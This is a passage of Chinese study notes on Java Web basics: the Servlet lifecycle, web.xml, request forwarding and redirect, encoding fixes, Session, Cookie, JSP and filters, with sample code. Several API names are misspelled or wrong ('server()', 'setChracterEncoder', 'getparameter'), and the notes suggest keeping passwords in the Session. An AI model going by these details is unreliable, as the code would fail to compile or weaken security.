那么，当服务器第一次接收到调用这个`Servelet`的类对象请求的时候，就会由容器创建一个`Servlet`类实例对象，然后服务器中就会调用`init(……)`方法(一个生命周期中`init()`方法只调用一次)进行初始化然后调用`server(……)`(一个生命周期中`server()`方法要调用多次)方法，以后每次接收到新的服务请求的时候，都会调用`server()`方法。当关闭服务器或者关闭这个`Servlet`(在`Tomcat`控制台中停止一个`Web`应用就会关闭这个应用中所有的`Servlet`)的时候，就会调用`destory()`方法。  
注意：当一个`Servlet`部署完成后，*启动`Web`服务器的时候*，就是一个`Web`应用程序(其中包含多个`Servlet`)启动的时候。即使此时并没有来自客户端的服务请求，但是此时的`Web`应用程序项目还是启动了。然后当接收到来自客户端的请求的时候，就会调用其中包含的各个`Servlet`的`init()`方法等。  

怎样修改一个`Web`应用程序(包含多个`Servlet`)启动的时候的行为？例如，在`Web`应用程序启动(也就是启动`Web`服务器的时候或者在`Tomcat`控制台中启动一个`Web`应用项目(一个`Web`应用项目中包含多个`Servlet`))，就调用`init()`方法而不是等到接收到客户端请求的时候才调用该方法。  
`Answer`：配置修改`web.xml`文件。  
>	
	<servlet>
      <servlet-name>doctor</servlet-name>
      <servlet-class>com.trilever.Doc</servlet-class>
	  <load-on-startup>1</load-on-startup>//此句用于设置在Web服务器启动本项目的时候即调用本Servlet的init()方法。0或1或2……用于指定在启动Web服务器时所要具体调用哪个Servlet的init()方法，例如：如果有多个Servlet，都设置为startup时启动，那么就要依据这里的数字顺序进行启动。
    </servlet>
	<servlet-mapping>
      <servlet-name>doctor</servlet-name>
      <url-pattern>/doctors</url-pattern>
    </servlet-mapping>
###ServletConfig参数对象
`init()`方法中的`ServletConfig`参数包含了这个`Servlet`对象的所有配置信息，这个配置信息从`web.xml`中读出来的。  
关于`Servlet`参数，见图`ServletConfig_Parameter.png`：

###Servlet中的request参数对象
在我们的`doPost()`或者`doGet()`方法中，会传递给它们一个`HttpServletRequest`参数对象，这个对象是`Web`服务器(也就是容器`Tomcat`)将*客户端发送的请求的所有信息进行包装*而获得。`HttpServletReqest`是一个接口，这里是面向接口编程，实际传递给方法的是它的实现类对象(具体实现是有容器帮我们进行的，因为对请求信息的包装是容器帮助我们进行的)。以后可以通过`request`对象的方法来获得其封装的内容。  
`request`对象的方法：
1. `getparameter(name)`：获得文本框、单选框等`HTML`中`Form`元素提交的内容。`name`是这些元素的名字。  
2. `getparametervalues(name)`:获得多选框中提交的内容，`name`是多选框的名字。  
3. `getparameternames()`:获得`Form`中所有元素的名字，当我们不知道`Form`中有那些元素的时候可以使用。  
4. `getConTextpath()`:获得`WebApp`的名称，也称为虚拟路径，一般是项目名称。举例：`Tomcat`容器好比一个医院，我们一个网站(也就是一个`Web`应用程序)相当于一个科室，每个`Tomcat`服务器中可以放多个网站。每一个`Servlet`就相当于一个医生(负责对每一个客户端的请求作出回应)，每个科室有好多个医生。就好比一个网站有很多个`Servlet`用于接收处理各种各样的请求。  
5. `getServletPath()`：如果是请求的一个`Servlet`，那么返回这个`Servlet`的`url-parttern`。如果请求的是一个`jsp`页面，那么返回`jsp`文件名。  
6. `getRequestURI()`:获得`Servlet`的相对路径。  
7. `getRequestURL()`:获得`Servlet`的绝对路径，包括`IP`、端口号等等。  
8. `getScheme()`:获得使用的协议。  
9. `getRemoteAddr()`:获得客户端的`IP`地址。


因此我们可以在`Servlet`中通过这一个参数获得所接收请求的内容数据，如，获得一个`Form`中提交的各种数据，然后针对这些请求的内容予以回应并发送给客户端。这就是交互式网页的思维方式。因此，我们可以知道**一个`Servlet`的作用功能就是针对客户端`HTML`文档中的某一个表单或者一个超链接所提交的内容的一个回应。**

我们所言的框架，其底层就是对这些`Servlet`的包装、组合。
###Servlet方法重写
我们自己写的`Servlet`中需要重写`doPost()`方法与`doGet()`方法的意义何在？  
`Answer`：因为我们自己写的`Servlet`类中继承了`HttpServlet`中的`server()`方法，而这个`server()`方法中会依据客户端发送的请求是`post`还是`get`类型去选择调用`Servlet`类中的`doPost()`方法或者`doGet()`方法，所以我们自己重写了`doPost()`方法与`doGet()`方法就相当于重写了`server()`方法。  
所以当服务器接收到客户端的一个请求之后，就会自己调用该`Servlet`的`server()`方法，然后这个`server()`方法会依据接收到的请求类型确定应该调用`doPost()`还是`doGet()`方法去处理这个请求。  


在一个网页中发出请求访问`Servlet`的方法？
1. 通过网页中的超链接进行`Servlet`的请求访问。链接目的地址使用`Servlet`的`url`进行访问请求的发送。但是用这种方法的请求方式只有`get`方法。
2. 通过`Form`表单的提交进行`Servlet`的请求访问。在`action`属性中用`Servlet`的`url`以进行访问请求的发送。这种方式的请求可以是`get`也可以是`post`方法。
3. 直接在地址栏中填写`Servlet`的`url`地址进行请求访问。
###建立一个`Servelet`的操作步骤：
1. 创建一个类，继承自`HttpServelet`。  
2. `OverRide`两个方法，`doGet()`与`doPost()`。  
3. 去`web.XML`配置文件中进行注册配置`servlet`。此步很重要。  
使用示例如下：  
创建类的代码：  
>
	package com.trilever;
	import java.io.IOException;
	import java.io.PrintWriter;
	import javax.servlet.ServletException;
	import javax.servlet.http.HttpServlet;
	import javax.servlet.http.HttpServletRequest;
	import javax.servlet.http.HttpServletResponse;
	public class Doc extends HttpServlet
	{
		/* (non-Javadoc)
		 * @see javax.servlet.http.HttpServlet#doGet(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)
		 */
		@Override
		protected void doGet(HttpServletRequest req, HttpServletResponse resp)
				throws ServletException, IOException
		{
			// TODO Auto-generated method stub
	//		super.doGet(req, resp);
			//使用System.out是在服务器段进行打印，而不是在客户端。
			System.out.println("mark");
			//使用PrintWriter类是在客户端打印，也就是想客户端输出
			resp.setContentType("text/html");
			PrintWriter out = resp.getWriter();
			out.write("<html>");
			out.write("<head>");
			out.write("godo");
			out.write("</head>");
			out.write("<br>");
			out.write("<body>");
			out.write("love");
			out.write("<br>");
			out.write("make");
			out.write("</body>");
			out.write("</html>");
		}
>	
		/* (non-Javadoc)
		 * @see javax.servlet.http.HttpServlet#doPost(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse)
		 */
		@Override
		protected void doPost(HttpServletRequest req, HttpServletResponse resp)
				throws ServletException, IOException
		{
			// TODO Auto-generated method stub
	//		super.doPost(req, resp);
			resp.setContentType("text/html");
			PrintWriter out = resp.getWriter(); 
			out.write("<html>");
			out.write("<head>");
			out.write("godo");
			out.write("</head>");
			out.write("<br>");
			out.write("<body>");
			out.write("love");
			out.write("<br>");
			out.write("make");
			out.write("</body>");
			out.write("</html>");
		}
	}
>
`Web.XML`文件配置：  
>
	<servlet>
      <servlet-name>doctor</servlet-name>
      <servlet-class>com.trilever.Doc</servlet-class>
    </servlet>
	<servlet-mapping>
      <servlet-name>doctor</servlet-name>
      <url-pattern>/doctors</url-pattern>
    </servlet-mapping>
>
在浏览器中输入：http://localhost:8080/Hos/doctors 即可在服务器中调用`doGet()`方法，其向客户端发送我们想要的内容。该文件中的`url-pattern`就是向客户端暴露的用于访问该`Servlet`的地址路径。


###访问调用一个`Servlet`时的工作原理  
1. `Ip+Port`：调用服务器的服务。  
2. 加上项目名：调用这个项目。找到这个应用程序所在的项目。一个项目中可以有多个`Servlet`类。  
3. 通过`Web.XML`文件中的配置信息，找到我们想要的类(`Servlet`)。查找步骤是:通过配置文件中的`url-parttern`找到`servlet-name`，通过`servlet-name`找到`servlet-class`，这个就是我们想要找到的类。然后，这个类(就是前面我们自己创建的继承了`HttpServelet`类的那个类)就会自动调用`doGet()`或者`doPost()`(具体调用哪一个是依据我们`request`的模式进行选择)对我们的请求进行回应。这两个方法的回应返回给我们的浏览器，然后在浏览器中就可以接收到这两个方法中发出的内容，并进行解析从而获得页面。


##`WebApp`的请求应答模式：  
1. 用户输入地址或者填写表单上的数据提交之后，这些数据会被送到服务器上，定位服务器上的资源文件的地址就是`URL`。客户端就是依据`URL`去找到服务器上的资源的。  
2. 当服务器收到用户请求之后，就会调用相应的程序进行回应，这些结果就是一些`HTML`文档被这些相应的方法返回给客户端。例如、`Servelet`中的`doGet()、doPost()`方法。这两种方法中就是向客户端返回`HTML`文档内容。  
3. 当客户端浏览器接收到那些方法中返回的`HTML`文本后，就会进行解析，向用户呈现出网页。  
4. 浏览器与服务器之间的通信使用`HTTP`协议进行通信。

所谓的`Web`服务器就是`Tomcat`这样的服务器。是一个容器，也是`Servlet`引擎，也称之为容器。
见截图所示：

所谓的集群服务器，就是使用多个服务器。  
1. 防止其中一台当机之后，可以使用其他的机器接替他的工作。  
2. 可以做负载均衡，将单机的流量分配到多个机器上，就是所谓的负载均衡。  


##请求转发与重定向
`Servlet`的作用是处理客户端的请求，那么各个`Servlet`之间是怎样进行通信的？就好比，科室(`Web`应用程序)中的各个医生(`Servlet`)在其中一个不能诊断的时候怎样将病人交给另一个病人。  
`Answer`:通过请求转发与重定向。  
也就是说一个客户端请求可以调用多个不同的`Servlet`。

**请求转发**：由前可知，一个客户端发送给服务器的请求信息被包装成一个`request`对象发送给目的`Servlet`。一个`request`对象中包含两部分的内容：`parameter`和`attribute`。其中的`parameter`部分包含的信息对于接收的`Servlet`而言是可以查看但不能修改的，如客户端的`IP`地址、`URL`等。而`attribute`部分的内容对于接收的`Servlet`而言是可以修改的，每一个`Servlet`对这个`request`对象的修改都反映在`attribute`中而不是在`parameter`部分。而且多个`Servlet`都可以接收这个`request`并且对这个`request`的`attribute`部分进行修改，这个`request`在各个`Servlet`之间进行传递就是请求转发（请求转发是通过一个对象进行的)。`parameter`是只读的，而`attribute`是可读写的。  
就好比，当看一个医生A的时候，病历就相当于`request`，其中的病人名字、年龄等内容就是在`parameter`部分，是不能被医生修改的，医生诊断结果就写在`attribute`部分，当一个医生无法确定的时候就会让护士将这个病人交给医生B，医生B就可以修改A医生在病历上所作的诊断结果(`attribute`部分)。将病人交给医生B的过程就是请求转发，其中的护士就是负责进行请求转发的对象。
在请求转发中使用的对象就是`RequestDispatcher`类对象。
注：`request`可以看作是封装了`map`，里面都是键值对，如、`parameter`中就是一个个的键值对在里面，`attribute`中也是键值对在里面。
请求转发使用示例：

`Servlet1`中的`doGet()`方法重写：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
				throws ServletException, IOException
		{
			System.out.println("hello");
			//Servlet对象Bailang对request对象的修改体现在其中的Attribute上。
			request.setAttribute("zhanghao", "123");
			//通过RequestDispatcher对象对request进行转发重定向。转发给Servlet对象Heigou 
			RequestDispatcher rd = request.getRequestDispatcher("/Heigou");
			rd.forward(request, response);
		}

`Servlet2`中的`doGet()`方法重写：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
				throws ServletException, IOException
		{
			//获得转发的request对象中的attribute值。
			String zhanghao = (String) request.getAttribute("zhanghao");
			System.out.println(zhanghao);
			//Servlet对象重写设置attribute值，并将request对象转发给Servlet对象Yanjingshe。
			request.setAttribute("zhanghao","456");
			RequestDispatcher rd = request.getRequestDispatcher("/Yanjingshe");
			rd.forward(request, response);
		}

`Servlet3`中的`doGet()`方法重写：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
				throws ServletException, IOException
		{
			String zhanghao = (String) request.getAttribute("zhanghao");
			System.out.println(zhanghao);
			//Servlet对象重写设置attribute值，并将request对象转发给Servlet对象Yanjingshe。
			request.setAttribute("zhanghao","456");
		}

**重定向**：  
1. 在请求转发中，`request`在几个`Servlet`间传递的时候，`request`中的参数是会被传递的。而在`response`的重定向中，`request`中的参数是不会被传递的，而是生成新的`request`值。这就是二者的区别所在。  
2. 在请求转发中，`URL`地址不发生改变，即使发生了转发依旧不发生改变。但是在重定向中`URL`地址会发生变化。所以，请求转发会导致一个问题，对于客户端的表单提交，当发生刷新的时候，就会发生重复提交，因为`URL`地址是不变的。此时可以使用重定向防止表单重复提交。  
3. 请求转发中不用加`WebApp`项目名称，而重定向中，要么加`WebApp`项目名称要么使用去掉"/"的重定向后`Servlet`名称。  
4. 请求转发只能在同一个`WebApp`中的各个`Servlet`之间进行转发，而重定向则可以定向到不同的`WebApp`中的`Servlet`中，因为重定向不涉及参数的传递(因为参数传递会发生丢失)。但是，如果在使用重定向的时候确实想传递`request`参数，也是有办法的，那就是在`response`的重定向中加上要传递的那些参数即可。  
5. 在请求转发中，第一个`Servlet`接收到`post`请求，那么请求转发后接收到的`Servlet`全部都接收到`post`请求。反之亦然。但是，如果是重定向，即使第一个`Servlet`接收到的是`post`请求，那么重定向后接收到的`Servlet`依旧都是`get`请求。因为任何一次转发默认的是`get`请求。对于请求转发而言，即使多次转发，依旧是只算一次请求在各个`Servlet`之间传递(只有一个`request`对象)。而对于重定向而言，每重定向一次，就是产生了一次新的请求(产生新的`request`对象)，所以重定向后的`Servlet`接收的就是新的默认`get`请求(即使第一次接收的是`post`请求，也与之没有关系)。多次请求就会产生多个`request`对象。  
重定向使用代码示例：  
>
	//重定向值Heigou这个Servlet对象。后面使用的是绝对路径。
	response.sendRedirect(request.getContextPath()+"/Heigou");


那么什么时候该用请求转发什么时候该用重定向？  
`Answer`：当我们需要传递数据的时候使用请求转发，当不需要的时候使用重定向。例如，当在密码输入错误的情况下，就要使用重定向。  

##Java Web中的中文乱码的问题
###什么时候会出现中文乱码
`Answer`：  
1. `Servlet`相关：`request.getParameter()`时与`print()`时。  
2. `JSP`相关：`out.print()`时会出现。  

###出现中文乱码的原因 
中文浏览器使用`gbk`编码或者`GB-2312`编码，而`Tomcat`使用`ISO`编码，这样就会导致编码不一致的问题。  
所以要解决这个问题的手段就是统一所使用的编码。  
常用的编码格式：`gbk(中文)`、`ISO(英文)`、`UTF-8(国际)`，所以如果我们编写面向国际的代码，那么就使用`UTF-8`的编码格式。  

###在代码层面上的解决之道
由于`Web`应用程序是浏览器与服务器之间的`对话`。所以在代码层面上解决就在于对话所使用的语言(编码格式）。  
#####服务器对浏览器的回复，向浏览器发送消息时解决中文乱码。  
a.`Servlet`回复浏览器的情况。  
设置`response`的格式：  
>
	response.setContentType("text/html,charset=gbk");//这样就将服务器端回复客户端的编码格式设置为gbk。
	
b.`JSP`回复浏览器的情况。  
注意：我们请求`JSP`页面的时候，实际上是将`JSP`页面转译成一个`Servlet`，我们实际上请求的是`Servlet`，是这个`Servlet`向我们进行回复，这个`Servlet`向客户端打印出我们想要的内容，这个内容来自于`JSP`页面中的`HTML`部分。  
设置`JSP`回复的编码格式：  
>
	<%@ page language="java" import="java.util.*" pageEncoding="gbk"%>
	
这样设置了`JSP`中的编码格式之后，由其转译的`Servlet`中编码格式同样会发生改变。  
c.在`HTML`文档中的`meta`标记中进行设置，告诉浏览器使用什么编码集进行解读。  
实际中，我们都只在`JSP`中修改编码格式。a、b两种方式都几乎不用。  

####客户端向服务器发送消息解决中文乱码问题。  
a.`Servlet`接收客户端请求的情况。  
解决方法如下：  
A. 硬编码：  
在`request.getparameter()`获得请求的参数之后，将获得的结果进行硬编码成我们想看到的编码结果。
>
	String newStr = new String(request.getparameter("name").getbytes("ISO-8859-1"),"gbk");//这样就将服务器用ISO编码读得的字符串硬编码成gbk编码的newStr。也就是说Tomcat默认是用ISO编码读取的，但是浏览器是用gbk编码发送的，所以要通过硬编码的方式将Tomcat读取的内容还原成浏览器所发送的内容。
	
这种硬编码的方式对`doGet()`与`doPost()`都有用。*繁琐但是完全有效*。  
B. 只对`doPost()`有效的方法，更方便。在`request.getparameter()`前设置`reques`的编码方式：  
>
	request.setChracterEncoder("gbk");//在getparameter()之前就设置编码方式，必须在其之前设置的。这个是用于客户端向服务器发送消息时用的。而不是response用的那个，那是服务器向客户端发送消息时用的。
	request.getparameter("name");  
	
C.只对`doGet()`方法有效的方法。修改`Server.xml`文件	。  

b.`JSP`接收客户端请求时进行设置。其和`Servlet`中的方式一样。  
c.浏览器发送请求时进行设置。

纠正一个错误观点：`Enum`关键字与`Class`关键字并不是同级的，`Enum`包含了**`Class`与集合**的特征。`Enum`还表示一个集合，其是几个类对象的集合。 
如， 
> 
	public Enum Seasons
	{
		Spring,
		Summer(),
		Autumn,
		Winter();
		Seasons()
		{
>	
		}
	}



#Java Web中的MVC
在`Java Web`项目中有两种架构，**模型1**与**模型2**。  
模型2就是使用了`MVC`架构。`MVC>=模型2`。  
模型1的架构见图`Java_Web_Model1.png`：  

模型2的架构见图`Java_Web_Model2.png`：  

但是模型1已经在现实中被淘汰了。其采用了所谓的`JavaBean`，实际上就是一个`Java`类。  
实际中都是使用模型2做`Java Web`程序。  
`Java Web`中使用`MVC`协作如图`MVC_Model`、`MVC_Coperation`所示：  


`MVC`是软件结构中用于`表示层`中的架构。作用是：**用于数据的显示**.  
比如、在我们的`TMS`程序中，为了显示查询的数据集合结果，我们使用了`MVC`模型。  

软件结构中有3层：表示层、业务层、持久化层。是一种设计思想，不是设计模式。  
##MVC框架中的构件
`MVC`架构中的组件，见图`MVC_Component.png`：  

`Model`：核心部分，存储封装数据。  
`View`：外观，与用户交互。  
`Controller`：枢纽，响应请求，处理跳转，使模型与视图保存一致。  
`Controller`的功能就是将前二者连接起来。一个构件模块只做一件事。

我们自己写的`MVC`框架会有一些缺点。  
例如，`TMS`系统中为了显示数据集合我们自己写了一个`Model`，使用了`MVC`的思想，但是是有缺点的。  
所以实际应用中我们要大量使用别人写的`MVC`框架。如`Structs1`、`Spring MVC`等  

##Java Web中表现层所用的框架
表现层所用的框架有`MVC`框架还有`JSF`框架，见图`Presentation_Layer_Frame.png`：  

注意：`JSF`框架不是`MVC`框架，它是基于事件处理的框架，就好像我们在`AWT/Swing`中使用的事件监听，就是基于事件处理的框架。

#Java Web中与用户进行交互
---
##基础知识
会话：我们将每一个网站视为一个`Web`应用程序。那么我们从登陆这个网站到离开这个网站关闭其所有的页面的过程称为与此网站的一次会话。  

Http协议创建的连接不是长久保持的连接，不像C/S架构的软件那样，客户端与数据库之间的连接时可以长久保持的。而Http协议建立的B/S连接是不会在客户端与服务器之间长久保持的。  
同时Http协议创建的连接时*无状态*的。所谓的无状态就是：这个连接不能存储下其所连接的客户端的私有信息。也就是说，每次客户端与服务器通过Http协议进行连接、断开之后，这个连接并不能保存下这个客户端的私有信息。这就称为*无状态*，而*有状态*就是可以存储客户端的私有信息。  

当我们登陆一个网站(Web app)以完成我们的任务时，在同一次会话中发生多次请求。我们需要对这个Web App发出多次的请求才能完成任务。例如，当我们登陆一个网站购买东西的时候，就需要多次点击多次向网站App发送请求，而由于Http请求的特征，每次发送请求都是一次新的连接，由于Http协议的会话不能存储每次连接的客户端信息，那么同一个用户的多次请求怎样才能被分辨而不至于与其他用户的相同时间段的请求发生混淆。那么就必须使用会话跟踪技术，使得每个客户端的信息能够被记住，这样无论其请求多少次，都不至于与其他用户的请求发生混淆。

##会话跟踪
那么怎样保存客户端与服务器连接过程中的客户端私有信息？就是使用会话跟踪技术。其用于保存同意时刻不同客户端会话的私有信息以使得可以将各个客户端分别开来。  
实现会话跟踪技术有两种：  
###Session
这是重点。所谓的Session就是：由服务器分配给客户端的用于保存客户端私有信息的**内存空间**。这个Session的编号就是SessionID，SessionID实际上就是这块内存空间的首地址。Session是由Web Server进行分配。当一个客户端第一次与这个服务器相连接也就是第一次会话时，就会给其分配一个Session，当第二次进行会话的时候，该客户端就可以通过SessionID继续使用以前分配给它的Session进行私有信息的存储。同时为了提高服务区端内存空间的利用率，就会为Session设置过期时间，Tomcat设置为30min，过时之后，就会进行回收。  
Session是面向无状态连接的Http协议会话的有状态的有益补充。  
####客户端怎样保存SessionID
a.Cookie的方式：是Servlet API规范要求我们使用的方式。其运行机制对于我们而言是透明的，服务器怎样向客户端发送了Cookie我们不用管，Cookie中怎样保存了SessionID我们也不用管。下一次请求的时候，客户端怎样从Cookie中取出SessionID发送给服务器端我们也不用管。我们可以显式设置Cookie。当客户端禁用了Cookie的时候，关于Cookie的操作就不能用了。  
b.url重写的方式，当禁用了Cookie的时候，就可以使用url重写来保存Session  。
c.隐藏表单域的方式，不推荐使用。
####服务器中的Servlet怎样向客户端返回Session
实际上返回给客户端的是Session的句柄，通过方法request.getSession()即可为该客户端返回一个Session对象。
####服务器中的JSP怎样向客户端返回Session
####Session常用方法
setAttribute(String key,String value):向Session中存储对象。使用该方法可以将用户登录账号、密码存储起来。  
getAttribute(String key)：从Session中获取对应的对象。  
removeAttribute(String key):从Session中删除对应的对象。  
getAttributeName()：获得Session中存储的key值集合。
invalidate()：强制使Session过期，用于安全退出，保证Session的安全。

####Session的生命周期
第一次请求时创建Session。  
Session消亡：  
1. 退出对话之后，过了生命周期即消亡。  
2. 调用Session的invalidate()方法。  
3. Web Server停止运行。  

一个客户端的Session在这整个会话中有效。也就是说，在这个会话中的多次请求中是可以共享的，一次请求中存储在该Session中的信息是可以被这次会话中的其他请求使用。  
例如，在一次会话中，第一次是请求一个Servlet，在这个请求中于Session中存储了客户端的账号、密码。然后，客户端在第二次请求一个JSP，那么就可以在这个JSP中获得那个Servlet请求中存储在Session中的账号、密码。  
request的Attribute通过请求转发是在多个Servlet中共用(就是将本次请求的参数在各个Servlet间进行共用，多个Servlet进行回应。保存于request的Attribute中的参数的存活期仅在于本次请求，时间短)，而Session的Attribute是在多次请求(同一次会话)间共用(有多次请求，各个请求之间可以共用，不管各个请求各自请求Servlet还是JSP均可。保持与Session中的参数的存活期是很多次请求，时间长)。  

请求转发与Session的不同点在于：存储共享数据的生命周期不同，共享对象不同。使用范围不同。请求转发是一次请求一个存储，Session是一次会话一个存储，一次会话包括了多个请求。如果能够用请求转发就能共享的数据，就使用请求转发即可，而用不着Session，为了节省内存空间。
JSP中通过内置对象Session直接使用，是一个内置对象。
Session使用实例：
JSP中使用Session:  

在Servlet中向Session中储存客户端数据：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
		{
			//返回给客户端的Session
			HttpSession s = request.getSession();
			s.setAttribute("name", name);
		}
		
在Servlet中取出Session中储存的客户端数据：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
				throws ServletException, IOException 
		{
			HttpSession s = request.getSession();
			System.out.println(s.getAttribute("name"));
		}

在JSP中取出Session中储存的客户端数据：
>
	<body>
		<%=session.getAttribute("name")%>
	</body>
	
	
####application对象
其实际上是一个对象名。是ServletContext类的实例对象，但在JSP中是一个内置对象。  
Session只能被同一个客户端使用。有限制。application对象可以被多个客户端共享。其范围最大。只要整个程序(包含多个Servlet)启动，即创建一个application，这是一个单态类。  
在Servlet中通过方法获得application对象。  
>
	ServletContext application = super.getServletContext();//获得ServletContext对象application
	或者
	ServletContext application = super.getServletConfig().getServletContext();//也可以获得ServletConText对象application

application使用实例：
在JSP中：application用于在多个客户端之间共享参数"sum"
>
	<body>
	    <% Object sums = application.getAttribute("sum");
	    	int sum= 0;
	    	if(sums==null)
	    		sums="0";
	    	sum=Integer.parseInt(sums.toString());
	    	sum++;
	    	application.setAttribute("sum", sum);
	    %>
	    sum:<%=sum %>
	</body>

在JSP中，application就是一个内置对象。可以拿来直接使用。

####Request、Session、Application三者对比
见图`Request_Session_Application_Contrast.PNG`所示：  
上述三者均可用于Java Web中的数据存储共享，那么具体该存放在哪一个里面的原则是：  
数据能储存在小范围内解决问题，就不要存放在大的范围内。
###URL重写与Cookie
####URL重写
当客户端或者浏览器禁用Cookie的时候，那么我们的SessionID放在哪里？
可以使用URL重写的方法来在禁用Cookie的时候共享Session。
URL重写使用实例：
注：当我们想从一个页面中跳转到另一个页面(或者回到现在的页面)的时候，可以在Servlet中使用重定向。
####Cookie
客户端信息可以储存在服务器开辟的空间Session中。  
也可以储存在客户端开辟的空间Cookie中。  
Cookie使用示例：  

存储Cookie的Servlet示例：将客户请求中发送过来的信息存储到Cookie中。
>
	public void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
		{
			String nameInfo=request.getParameter("name");
			System.out.println(nameInfo);
			//创建Cookie，然后给其添加内容
			Cookie c = new Cookie("nameinfo",nameInfo);
			//设置Cookie的存活时间
			c.setMaxAge(10000000);
			//将我们创建好的Cookie发送给客户端
			response.addCookie(c);
>			
			//重定向跳转到新的页面上
			response.sendRedirect("MyJsp.jsp");
		}

从Cookie中取出存储内容的JSP示例：注意，当我们请求JSP的时候，JSP中同样会收到request对象。
>
	<body>
	    <% 
	    	//取出Cookie
	    	Cookie[] co = request.getCookies();
	    	//读取Cookie中的内容。
	    	for(Cookie c:co)
	    	{
	    		System.out.println(c.getValue());
	    	}
	    %>
	</body>
	
使用Session、Cookie存储用户信息的比较，见图`Session_Cookie_Contrast.PNG`：

#Java Web中的JSP
---
JSP技术是建立于Servlet之上的。  
JSP！=Java+DHTML  
JSP页面=Java+DHTML  
JSP实际上就是一个Servlet类。  
JSP代码运行原理如图`JSP_Fundamental.PNG`所示：  
第一次运行的时候：.jsp首先转译为.java(也就是Servlet代码)，再编译为.class代码。  
第二次运行的时候：直接请求.class代码。

##JSP组成
JSP页面包括：  
1. 注释：HTML注释、Java注释、JSP注释。  
2. 模板：就是界面原型，界面显示的外形，美工关心的。就是`HTML`部分的内容。  
3. 元素：脚本元素、指令元素、动作元素。  

###脚本元素
脚本元素示例：脚本元素有3种，声明部分，小脚本，表达式。
>
	<%!
		//声明部分，声明变量与方法，使用！作为标识，表明该部分转换为Servlet后直接变为Java代码。此处声明的变量是全局的，转换后放在Servlet类中。
		int a = 1;
		int sum(int a,int b)
		{
			return a+b;
		}
	%>	
	<%
		//小脚本，不用标识，在转换为Servlet之后直接变为Java代码。但是与声明部分不同的是：小脚本中声明的变量是局部的，转换后放在某一个方法中。
		int reuslt = sum(10,20)；
	%>
		//表达式，表达式部分使用=进行标识，表明该部分转换为Servlet之后放在out.write()之中，直接在HTML中显示。注：其后无分号。
	<%=
		result
	%>
	

###指令元素
以<%@ %>为标志。所谓的指令，就是告诉Web服务器，在编译本文件的时候需要哪些准备。有page指令、include指令、taglib指令，见图：
####page指令
在JSP的任何地方、以任何顺序，一个页面中可以包含任意数量的page指令。  
除了import，任何的属性/值对只能出现一次。  
page指令的属性有:language、import、contentType、errorPage、isErrorPage，见图:
page指令示例：  
>
	<%@ page language="java" import="java.util.*" contentType="text/html; charset=gbk" errorPage="MyError.jsp"%>
	
####include指令
当网站的多个页面中具有某些相同元素，例如各个页头是相同的，那么为了节省代码，可以使用HTML中的框架，将相同的那一部分拆开为一个单独的部分进行使用。  
也可以使用JSP中的include指令，将各个页面中的相同部分写成一个页面，然后再各个页面中使用include指令将他们包含进来。  
include指令用于在运行的时候将其他HTML文档或者JSP也没嵌入到本JSP页面。  
include之类的属性有：file属性。  
但是要注意页面中不要定义了相同变量，也就是被嵌入的页面与嵌入页面中不要有同名变量的定义。  
include指令使用示例：  
>
	<%@ include file = "文件名" %>//将其他的一个文件放入本文件中。
	
###动作元素
动作元素是鸡肋知识，没什么用了。主要为模型1服务，模型2基本不用。主要是方便在JSP页面中使用JavaBean。  
以<jsp: >为标志。
动作元素见图：
##JSP的隐藏对象
在JSP的脚本元素中可以使用JSP的隐藏对象。 
隐藏对象无需使用者声明、创建。由容器维护、管理。  
例如，session、request、application对象就可以在JSP的脚本元素(除了声明之外)中使用。
JSP的隐藏对象见图`JSP_Inner_Object.PNG`所示：  

注：关于response对象的方法使用，我们很少再使用out.print()来向客户端发送内容。而是直接使用重定向的技术：response.sendRedirect();转发至我们想要发送的内容的那个页面即可。而不要直接输出。

##JSP中异常处理
若发生异常，可以跳转至异常显示页面。

#Java Web中的过滤器
----
在Java Web中，除了JSP、Servlet可以接收客户端请求，处理客户端请求之外，过滤器也可由接收客户端请求。
过滤器是向Web App响应前和过滤后添加新功能的组件。  
我们的一个Web App中有多个Servlet或者JSP，其中有些Servlet中的某些操作时相同的。那么我们可以将这些操作提取出来成为一个新的类，在客户请求到达后面的那些Servlet之前就将那些相同的操作通过新的类予以实现。这个新的类就发挥了过滤器的作用。也就是说在那些Servlet对客户请求做出响应之前就对之予以过滤。就是精简了Servlet的功能，减小代码冗余。过滤器作为一个预备处理功能。  

注意:过滤器不仅可用于Servlet还可以用于JSP。

开发一个过滤器(Filter)需要实现一个接口(Filter)。
在做项目时，最多的是使用前过滤，也就是在过滤器中的doFilter()之前，很少使用后过滤。

过滤器使用步骤：
1. 实现Filter接口。重写doFilter()方法。  
2. 配置Web.xml文件，配置方法与Servlet类似。
过滤器使用示例：  
未使用过滤器的示例：  
Servlet xizhao代码：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
	{
		System.out.println("tuoyifu");
		System.out.println("xizhao");
		System.out.println("chuanyifu");
	}
	
Servlet anmo代码：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
	{
		System.out.println("tuoyifu");
		System.out.println("anmo");
		System.out.println("chuanyifu");
	}
	
使用过滤器的示例：  
Servlet xizhao代码：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
	{
		System.out.println("xizhao");
	}
	
Servlet anmo代码：
>
	public void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException 
	{
		System.out.println("anmo");
	}
	
过滤器代码：
>
	//过滤器抽取了前面两个Servlet中相同的操作
	public class PreFilter implements Filter 
	{
		@Override
		public void destroy() 
		{
		}
		@Override
		public void doFilter(ServletRequest request, ServletResponse response,
				FilterChain filterchain) throws IOException, ServletException 
		{
			// TODO Auto-generated method stub
			System.out.println("tuoyifu");
			//doFilter()方法是一个分界线，之前的代码表示是之前过滤的，之后的代码表示是之后过滤的。该方法表示请求转向Servlet的doPost()或者doGet()方法进行执行。
			//Servlet中德方法执行完成之后才继续执行本Filter中的方法。
			filterchain.doFilter(request, response);
			System.out.println("chuanyifu");
		}
		@Override
		public void init(FilterConfig arg0) throws ServletException 
		{
		}
	}
	
Web.xml配置：  
>
	<filter>
		<filter-name>PreFilter</filter-name>
